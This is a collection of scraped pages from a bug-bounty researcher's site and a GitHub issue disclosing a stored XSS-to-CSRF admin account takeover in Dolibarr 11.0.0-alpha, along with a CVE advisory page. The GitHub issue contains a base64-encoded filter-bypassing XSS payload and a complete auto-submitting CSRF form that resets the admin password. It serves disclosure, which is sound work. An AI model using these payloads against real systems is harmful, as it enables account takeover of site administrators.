=== Content from gauravnarwani.com_848c7d54_20250121_023323.html ===

[![I'm Gaurav Narwani](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/08/cropped-5bbb9c39-2870-42f0-83ab-60666e28d168-2.jpg?fit=363%2C299&ssl=1)](https://gauravnarwani.com/)
[I'm Gaurav Narwani](https://gauravnarwani.com "I'm Gaurav Narwani")

Security Researcher | Bug Bounty Hunter
 Menu

[Skip to content](#primary "Skip to content")
![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2022/03/bscp.jpeg?resize=311%2C162&ssl=1)

## Burp Suite Certified Practitioner Exam ‚Äì Review

CTF

Read more > Burp Suite Certified Practitioner Exam ‚Äì Review

[View more](https://gauravnarwani.com/burp-suite-certified-practitioner-exam-review/)

![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2021/10/input.jpg?resize=500%2C500&ssl=1)

## Account Takeover via improper input validation

Bug Bounty

Read more > Account Takeover via improper input validation

[View more](https://gauravnarwani.com/account-takeover-via-improper-input-validation/)

![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/10/8619276-3x2-700x467.jpg?resize=660%2C467&ssl=1)

## Escalating Privileges like a Pro

Bug Bounty

Read more > Escalating Privileges like a Pro

[View more](https://gauravnarwani.com/escalating-privileges-like-a-pro/)

![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/09/what-is-csrf.jpg?resize=660%2C345&ssl=1)

## Admin hijacked by Sea Surf Pirates

Bug Bounty

Read more > Admin hijacked by Sea Surf Pirates

[View more](https://gauravnarwani.com/admin-hijacked-by-sea-surf-pirates/)

![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/08/gg1.jpg?resize=660%2C660&ssl=1)

## Cookie worth a fortune

Bug Bounty

Read more > Cookie worth a fortune

[View more](https://gauravnarwani.com/cookie-worth-a-fortune/)

![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/08/xss_acct_takeover.jpg?resize=660%2C600&ssl=1)

## How I XSSed Admin Account

Bug Bounty

Read more > How I XSSed Admin Account

[View more](https://gauravnarwani.com/how-i-xssed-admin-account/)

![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/07/Server-Side-Template-Injection-Zafiyeti-social.png?resize=660%2C630&ssl=1)

## Injecting {{6\*200}} to $1200

Bug Bounty

Read more > Injecting {{6\*200}} to $1200

[View more](https://gauravnarwani.com/injecting-6200-to-1200/)

![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/05/xss.jpg?resize=660%2C394&ssl=1)

## XSSed my way to 1000$

Bug Bounty

Read more > XSSed my way to 1000$

[View more](https://gauravnarwani.com/xssed-my-way-to-1000/)

![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/04/2fa.png?resize=660%2C660&ssl=1)

## Two-Factor Authentication Bypass

Bug Bounty

Read more > Two-Factor Authentication Bypass

[View more](https://gauravnarwani.com/two-factor-authentication-bypass/)

![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/03/xss.png?resize=313%2C161&ssl=1)

## alert(‚ÄúA tale of 3 XSS!‚Äù)

Bug Bounty

Read more > alert(‚ÄúA tale of 3 XSS!‚Äù)

[View more](https://gauravnarwani.com/a-tale-of-3-xss/)

## Posts navigation

[Older posts](https://gauravnarwani.com/page/2/)

 Menu

### Browse

* [Home](https://gauravnarwani.com)
* [About Me](https://gauravnarwani.com/about-me/)
* [Blog](https://gauravnarwani.com)
* [Awards](https://gauravnarwani.com/awards/)
* [Talks](https://gauravnarwani.com/talks/)
* [Contact](https://gauravnarwani.com/contact/)
* [Publications](https://gauravnarwani.com/publications/)
* [Resumeüì•](https://gauravnarwani.com/wp-content/uploads/2023/09/Gaurav_Narwani_Resume_2023.pdf)
### Follow Me

* [LinkedIn](https://www.linkedin.com/in/gauravnarwani97)
* Email
* [Instagram](https://www.instagram.com/gaurav_narwani/)
* [Facebook](https://www.facebook.com/gaurav.d.narwani)
* [GitHub](https://github.com/gauravnarwani97)
* [Twitter](https://twitter.com/gauravnarwani97)
### Buy me a Coffee

[![Buy me a coffee](https://bmc-cdn.nyc3.digitaloceanspaces.com/BMC-button-images/BMC-btn-logo.svg)Buy me a coffee](https://www.buymeacoffee.com/7JOe3dMcv)
### Blog Stats

* 93,371 hits
### Follow me on Twitter

[My Tweets](https://twitter.com/gauravnarwani97)
### Subscribe to Blog via Email

Enter your email address to subscribe to this blog and receive notifications of new posts by email.

Email Address

Subscribe

Join 68 other subscribers

### Main menu

* [Bug Bounty](https://gauravnarwani.com/category/bugb/)
* [CTF](https://gauravnarwani.com/category/ctf/)
* [News](https://gauravnarwani.com/category/news/)

Search for:

63410  Close

Copyright ¬© 2025 [I'm Gaurav Narwani](https://gauravnarwani.com). All Rights Reserved.



=== Content from gauravnarwani.com_318de516_20250121_023336.html ===

[![I'm Gaurav Narwani](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/08/cropped-5bbb9c39-2870-42f0-83ab-60666e28d168-2.jpg?fit=363%2C299&ssl=1)](https://gauravnarwani.com/)
[I'm Gaurav Narwani](https://gauravnarwani.com "I'm Gaurav Narwani")

Security Researcher | Bug Bounty Hunter
 Menu

[Skip to content](#primary "Skip to content")
![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2022/03/bscp.jpeg?resize=311%2C162&ssl=1)

## Burp Suite Certified Practitioner Exam ‚Äì Review

CTF

Read more > Burp Suite Certified Practitioner Exam ‚Äì Review

[View more](https://gauravnarwani.com/burp-suite-certified-practitioner-exam-review/)

![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2021/10/input.jpg?resize=500%2C500&ssl=1)

## Account Takeover via improper input validation

Bug Bounty

Read more > Account Takeover via improper input validation

[View more](https://gauravnarwani.com/account-takeover-via-improper-input-validation/)

![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/10/8619276-3x2-700x467.jpg?resize=660%2C467&ssl=1)

## Escalating Privileges like a Pro

Bug Bounty

Read more > Escalating Privileges like a Pro

[View more](https://gauravnarwani.com/escalating-privileges-like-a-pro/)

![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/09/what-is-csrf.jpg?resize=660%2C345&ssl=1)

## Admin hijacked by Sea Surf Pirates

Bug Bounty

Read more > Admin hijacked by Sea Surf Pirates

[View more](https://gauravnarwani.com/admin-hijacked-by-sea-surf-pirates/)

![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/08/gg1.jpg?resize=660%2C660&ssl=1)

## Cookie worth a fortune

Bug Bounty

Read more > Cookie worth a fortune

[View more](https://gauravnarwani.com/cookie-worth-a-fortune/)

![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/08/xss_acct_takeover.jpg?resize=660%2C600&ssl=1)

## How I XSSed Admin Account

Bug Bounty

Read more > How I XSSed Admin Account

[View more](https://gauravnarwani.com/how-i-xssed-admin-account/)

![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/07/Server-Side-Template-Injection-Zafiyeti-social.png?resize=660%2C630&ssl=1)

## Injecting {{6\*200}} to $1200

Bug Bounty

Read more > Injecting {{6\*200}} to $1200

[View more](https://gauravnarwani.com/injecting-6200-to-1200/)

![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/05/xss.jpg?resize=660%2C394&ssl=1)

## XSSed my way to 1000$

Bug Bounty

Read more > XSSed my way to 1000$

[View more](https://gauravnarwani.com/xssed-my-way-to-1000/)

![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/04/2fa.png?resize=660%2C660&ssl=1)

## Two-Factor Authentication Bypass

Bug Bounty

Read more > Two-Factor Authentication Bypass

[View more](https://gauravnarwani.com/two-factor-authentication-bypass/)

![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/03/xss.png?resize=313%2C161&ssl=1)

## alert(‚ÄúA tale of 3 XSS!‚Äù)

Bug Bounty

Read more > alert(‚ÄúA tale of 3 XSS!‚Äù)

[View more](https://gauravnarwani.com/a-tale-of-3-xss/)

## Posts navigation

[Older posts](https://gauravnarwani.com/page/2/)

 Menu

### Browse

* [Home](https://gauravnarwani.com)
* [About Me](https://gauravnarwani.com/about-me/)
* [Blog](https://gauravnarwani.com)
* [Awards](https://gauravnarwani.com/awards/)
* [Talks](https://gauravnarwani.com/talks/)
* [Contact](https://gauravnarwani.com/contact/)
* [Publications](https://gauravnarwani.com/publications/)
* [Resumeüì•](https://gauravnarwani.com/wp-content/uploads/2023/09/Gaurav_Narwani_Resume_2023.pdf)
### Follow Me

* [LinkedIn](https://www.linkedin.com/in/gauravnarwani97)
* Email
* [Instagram](https://www.instagram.com/gaurav_narwani/)
* [Facebook](https://www.facebook.com/gaurav.d.narwani)
* [GitHub](https://github.com/gauravnarwani97)
* [Twitter](https://twitter.com/gauravnarwani97)
### Buy me a Coffee

[![Buy me a coffee](https://bmc-cdn.nyc3.digitaloceanspaces.com/BMC-button-images/BMC-btn-logo.svg)Buy me a coffee](https://www.buymeacoffee.com/7JOe3dMcv)
### Blog Stats

* 93,371 hits
### Follow me on Twitter

[My Tweets](https://twitter.com/gauravnarwani97)
### Subscribe to Blog via Email

Enter your email address to subscribe to this blog and receive notifications of new posts by email.

Email Address

Subscribe

Join 68 other subscribers

### Main menu

* [Bug Bounty](https://gauravnarwani.com/category/bugb/)
* [CTF](https://gauravnarwani.com/category/ctf/)
* [News](https://gauravnarwani.com/category/news/)

Search for:

29969  Close

Copyright ¬© 2025 [I'm Gaurav Narwani](https://gauravnarwani.com). All Rights Reserved.



=== Content from github.com_0db5f5fb_20250121_002610.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FDolibarr%2Fdolibarr%2Fissues%2F11671)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FDolibarr%2Fdolibarr%2Fissues%2F11671)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=Dolibarr%2Fdolibarr)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Dolibarr](/Dolibarr)
/
**[dolibarr](/Dolibarr/dolibarr)**
Public

* [Notifications](/login?return_to=%2FDolibarr%2Fdolibarr) You must be signed in to change notification settings
* [Fork
  2.8k](/login?return_to=%2FDolibarr%2Fdolibarr)
* [Star
   5.6k](/login?return_to=%2FDolibarr%2Fdolibarr)

* [Code](/Dolibarr/dolibarr)
* [Issues
  951](/Dolibarr/dolibarr/issues)
* [Pull requests
  217](/Dolibarr/dolibarr/pulls)
* [Actions](/Dolibarr/dolibarr/actions)
* [Projects
  3](/Dolibarr/dolibarr/projects)
* [Security](/Dolibarr/dolibarr/security)
* [Insights](/Dolibarr/dolibarr/pulse)

Additional navigation options

* [Code](/Dolibarr/dolibarr)
* [Issues](/Dolibarr/dolibarr/issues)
* [Pull requests](/Dolibarr/dolibarr/pulls)
* [Actions](/Dolibarr/dolibarr/actions)
* [Projects](/Dolibarr/dolibarr/projects)
* [Security](/Dolibarr/dolibarr/security)
* [Insights](/Dolibarr/dolibarr/pulse)

# Stored XSS -> CSRF -> Admin Account Takeover¬†#11671

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkClosedClosed[Stored XSS -> CSRF -> Admin Account Takeover](#top)#11671Copy link![@gauravnarwani97](https://avatars.githubusercontent.com/u/26684298?u=3f4e096a5b52e428f809fc572bda2940718dd2c9&v=4&size=80)
## Description

![@gauravnarwani97](https://avatars.githubusercontent.com/u/26684298?u=3f4e096a5b52e428f809fc572bda2940718dd2c9&v=4&size=48)[gauravnarwani97](https://github.com/gauravnarwani97)opened [on Aug 9, 2019](https://github.com/Dolibarr/dolibarr/issues/11671#issue-478913566)
# Bug

Hello Team, Dolibar 11.0.0-alpha suffers from a Stored XSS in the Label field of Link a new file/document in Linked Files of the User. An attacker could use this feature to introduce a CSRF which would completely takeover admin's account. The protection for CSRF is restricted to referrer header and so if a CSRF request is stored inside the application, this feature is bypassed leading to change of account details. Moving to XSS, the various protections do just display an error message when certain keywords forming an XSS payload. This can be easily bypassed by using an object tag with base64 encoding our payload inside it. For to convert the XSS to CSRF, i'm using the iframe tag inside the object tag to load my CSRF request in its src attribute.

How to takeover admin account? A request is sent to user/card.php where various details of admin can be changed i.e id=1. The attacker just needs the login username of the admin with some random values in firstname and lastname to successfully submit a request. In this request password of admin can be changed, because it does'nt have field to enter previous password for validation. Hence it can be used to submit new password for admin and hence taking over admin account.

## Environment

* **Version**: 11.0.0-alpha
* **OS**: Windows NT IN09726343L 10.0 build 17134 (Windows 10) AMD64
* **Web server**: Apache/2.4.39 (Win64) OpenSSL/1.1.1c PHP/7.3.6
* **PHP**: 7.3.6
* **Database**: MySQL or MariaDB 5.5.5-10.3.15-MariaDB
* **URL(s)**:

  <http://localhost/dolibarr/user/document.php?userid=2> -> XSS/CSRF

  <http://localhost/dolibarr/user/card.php> -> CSRF request sent to this URL

## Expected and actual behavior

Expected behaviour: The application should block insertion of tags in pages which would lead to these issues.

Actual behaviuor: The application doesn't block tags and hence leads to XSS/CSRF

## Steps to reproduce the behavior

1. Login to user account as we will send a request from user to admin, just to show severity of impact. Here i'm logging into user asd and go to user card and click on Linked FIles Tab

   [![1.png](https://camo.githubusercontent.com/bdd8e58bf697ad3cd48ecd68168af6f87b32493716eeef57801dec6dace89a21/68747470733a2f2f6761757261766e617277616e692e636f6d2f646f6c69626172722f312e504e47)](https://camo.githubusercontent.com/bdd8e58bf697ad3cd48ecd68168af6f87b32493716eeef57801dec6dace89a21/68747470733a2f2f6761757261766e617277616e692e636f6d2f646f6c69626172722f312e504e47)
2. You will see that a user cannot add the Link a new file/document. To bypass this just open inspect element and hover to LINK box.

[![2.png](https://camo.githubusercontent.com/4aa44407e6fd08722377f5057a00a0560dec8c40cb921c5a50fbc70f0c79d3c9/68747470733a2f2f6761757261766e617277616e692e636f6d2f646f6c69626172722f322e504e47)](https://camo.githubusercontent.com/4aa44407e6fd08722377f5057a00a0560dec8c40cb921c5a50fbc70f0c79d3c9/68747470733a2f2f6761757261766e617277616e692e636f6d2f646f6c69626172722f322e504e47)

3. Now remove the value disabled="" from the tag. The link will now be activated.

[![3.png](https://camo.githubusercontent.com/b740ac8d11cc3035a1f497e4fbb79ec1b6f2cacb76fe74de7c5c0189ffdcc00a/68747470733a2f2f6761757261766e617277616e692e636f6d2f646f6c69626172722f332e504e47)](https://camo.githubusercontent.com/b740ac8d11cc3035a1f497e4fbb79ec1b6f2cacb76fe74de7c5c0189ffdcc00a/68747470733a2f2f6761757261766e617277616e692e636f6d2f646f6c69626172722f332e504e47)

4. Now add the value asdasd.com to URL and `</td></tr><object data=data:text/html;base64,PGlmcmFtZSBzcmM9Imh0dHA6Ly9sb2NhbGhvc3QvZG9saWJhcnIvY3NyZi5odG1sIj48L2lmcmFtZT4=><tr><td>` in the Label

   This is an iframe with source as a csrf file. <iframe src="http://localhost/dolibarr/csrf.html"> is the payload which is base64 encoded. You can add any source like upload it to your server as csrf.html . A new file will be added on behalf of user.

[![4.png](https://camo.githubusercontent.com/b7cf6d7a199bf3b604910931a884d3bb57d8c8c63b269bafd0d8d866e3bc3a06/68747470733a2f2f6761757261766e617277616e692e636f6d2f646f6c69626172722f342e504e47)](https://camo.githubusercontent.com/b7cf6d7a199bf3b604910931a884d3bb57d8c8c63b269bafd0d8d866e3bc3a06/68747470733a2f2f6761757261766e617277616e692e636f6d2f646f6c69626172722f342e504e47)

5. Add the following code as csrf.html

```
<html>
	<body onload="attack()">
		<script>
			function attack() {
				document.getElementById('hidden_form').submit();
			}
		</script>
		<form id="hidden_form" name="hidden_form" action="http://localhost/dolibarr/user/card.php" method="POST">
			<input type="text" name="action" value="update" /><br />
			<input type="text" name="id" value="1" /><br />
			<input type="text" name="admin" value="1" /><br />
			<input type="text" name="update" value="Save" /><br />
			<input type="text" name="login" value="admin" /><br />
			<input type="text" name="lastname" value="asd" /><br />
			<input type="text" name="firstname" value="hacked" /><br />
			<input type="text" name="password" value="admin000" /><br />
		</form>
	</body>
</html>

```

6. Now the attack vector is set. Now only the attacker needs to open the linked files page for the user. Login with admin user and head to all users -> asdasd asd.

[![6_1.png](https://camo.githubusercontent.com/fe74d1b9f5687c6b737e56399f008458e2aada3e7acf86edcf71b1da7b944e57/68747470733a2f2f6761757261766e617277616e692e636f6d2f646f6c69626172722f365f312e504e47)](https://camo.githubusercontent.com/fe74d1b9f5687c6b737e56399f008458e2aada3e7acf86edcf71b1da7b944e57/68747470733a2f2f6761757261766e617277616e692e636f6d2f646f6c69626172722f365f312e504e47)

As you can see in image 6\_1.png the admin firstname and lastname is admin admin. Now lets open the user asdasd asd.

Head to Users & Groups tab -> Click on user asdasd asd (6\_2.png).

[![6_2.png](https://camo.githubusercontent.com/91867b458c38e663321e7e1065eaf0ba3b26b422cc659e260305fef718be9ac3/68747470733a2f2f6761757261766e617277616e692e636f6d2f646f6c69626172722f365f322e504e47)](https://camo.githubusercontent.com/91867b458c38e663321e7e1065eaf0ba3b26b422cc659e260305fef718be9ac3/68747470733a2f2f6761757261766e617277616e692e636f6d2f646f6c69626172722f365f322e504e47)

Head to Linked files of user.

[![6_3](https://camo.githubusercontent.com/98df0f3c2408128c7f7fe93f6f1751e7c763fbed00324e85a1f68f6b0323b760/68747470733a2f2f6761757261766e617277616e692e636f6d2f646f6c69626172722f365f332e504e47)](https://camo.githubusercontent.com/98df0f3c2408128c7f7fe93f6f1751e7c763fbed00324e85a1f68f6b0323b760/68747470733a2f2f6761757261766e617277616e692e636f6d2f646f6c69626172722f365f332e504e47)

If you will see that the iframe is seen on the webpage which executes our CSRF succcessfullly changing the details of admin

7. Now open admin profile again. You will see the name has changed to hacked asd. The attacker can even change the password of the admin and takeover his account. In this case I have changed the password of admin to admin000

[![7.png](https://camo.githubusercontent.com/5815da714398432d4d7b212cf9afbb294bd13c63c5e01fd836e7c3c40c4f3d7e/68747470733a2f2f6761757261766e617277616e692e636f6d2f646f6c69626172722f372e504e47)](https://camo.githubusercontent.com/5815da714398432d4d7b212cf9afbb294bd13c63c5e01fd836e7c3c40c4f3d7e/68747470733a2f2f6761757261766e617277616e692e636f6d2f646f6c69626172722f372e504e47)

## Suggested steps

In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:

1. Input should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.
2. User input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > " ' and =, should be replaced with the corresponding HTML entities (< > etc).

In cases where the application's functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.

Here the xss protection is by using blacklist. Please don't use that, instead use the above mentioned approach

## Metadata

### Assignees

No one assigned

### Labels

No labelsNo labels
### Type

No type
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from gauravnarwani.com_e7df9fca_20250121_002608.html ===

[![I'm Gaurav Narwani](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/08/cropped-5bbb9c39-2870-42f0-83ab-60666e28d168-2.jpg?fit=363%2C299&ssl=1)](https://gauravnarwani.com/)
[I'm Gaurav Narwani](https://gauravnarwani.com "I'm Gaurav Narwani")

Security Researcher | Bug Bounty Hunter
 Menu

[Skip to content](#primary "Skip to content")
# CVE-2019-15062

## Dolibarr 11.0.0-alpha Stored CSRF to Account Takeover

#### Credits: Gaurav Narwani

The Common Vulnerabilities and Exposures (CVE) Program has assigned the ID‚Äã CVE-2019-14546 to this issue. This is an entry on the [CVE List](https://cve.mitre.org/cve/), which standardizes names for security problems.
<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15062>
CVE ID: CVE-2019-15062
Date of Disclosure: 15th August 2019

**Vendor, Product** ‚Äì Dolibarr, dolibarr
**Affected Product:** Dolibarr Version 11.0.0-alpha

**Severity Rating**:[AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:L](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:L)(CVSS Base Score:6.5)

**Description:**
An issue was discovered in Dolibarr 11.0.0-alpha. A user can store an IFRAME element (containing a user/card.php CSRF request) in his Linked Files settings page. When visited by the admin, this could completely take over the admin account. (The protection mechanism for CSRF is to check the Referer header; however, because the attack is from one of the application‚Äôs own settings pages, this mechanism is bypassed.) To exploit the vulnerability, the admin needs to open the profile of the attacker. This is done by generally browsing users panels.

**Proof of Concept:**
**Affected Component:** Add links Feature in User Settings was compromised.

![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/08/6_1.png?fit=1000%2C551&ssl=1)

Admin panel before Opening the Attackers dashboard

![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/08/7.png?fit=1000%2C669&ssl=1)

Admin panel after Opening the Attackers dashboard

## Credit: Gaurav Narwani

 Menu

### Browse

* [Home](https://gauravnarwani.com)
* [About Me](https://gauravnarwani.com/about-me/)
* [Blog](https://gauravnarwani.com)
* [Awards](https://gauravnarwani.com/awards/)
* [Talks](https://gauravnarwani.com/talks/)
* [Contact](https://gauravnarwani.com/contact/)
* [Publications](https://gauravnarwani.com/publications/)
* [Resumeüì•](https://gauravnarwani.com/wp-content/uploads/2023/09/Gaurav_Narwani_Resume_2023.pdf)
### Follow Me

* [LinkedIn](https://www.linkedin.com/in/gauravnarwani97)
* Email
* [Instagram](https://www.instagram.com/gaurav_narwani/)
* [Facebook](https://www.facebook.com/gaurav.d.narwani)
* [GitHub](https://github.com/gauravnarwani97)
* [Twitter](https://twitter.com/gauravnarwani97)
### Buy me a Coffee

[![Buy me a coffee](https://bmc-cdn.nyc3.digitaloceanspaces.com/BMC-button-images/BMC-btn-logo.svg)Buy me a coffee](https://www.buymeacoffee.com/7JOe3dMcv)
### Blog Stats

* 93,369 hits
### Follow me on Twitter

[My Tweets](https://twitter.com/gauravnarwani97)
### Subscribe to Blog via Email

Enter your email address to subscribe to this blog and receive notifications of new posts by email.

Email Address

Subscribe

Join 68 other subscribers

### Main menu

* [Bug Bounty](https://gauravnarwani.com/category/bugb/)
* [CTF](https://gauravnarwani.com/category/ctf/)
* [News](https://gauravnarwani.com/category/news/)

Search for:

4988  Close

Copyright ¬© 2025 [I'm Gaurav Narwani](https://gauravnarwani.com). All Rights Reserved.

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###


